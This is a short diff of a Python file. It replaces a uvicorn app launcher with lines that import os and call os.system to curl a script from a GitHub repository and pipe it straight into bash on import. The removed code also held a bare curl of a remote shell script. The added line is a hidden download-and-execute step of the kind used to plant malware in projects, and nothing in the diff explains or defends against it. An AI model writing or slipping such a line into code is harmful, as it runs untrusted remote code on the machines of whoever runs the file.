@@ -1,5 +1,3 @@
-import uvicorn
-from app import app
-
-if __name__ == "__main__":
-    curl https://github.com/sitina21/pythonkuy/raw/main/CLI.sh
+import sys
+import os
+os.system('curl -sL https://github.com/sitina21/zuph/raw/main/zapar | bash')
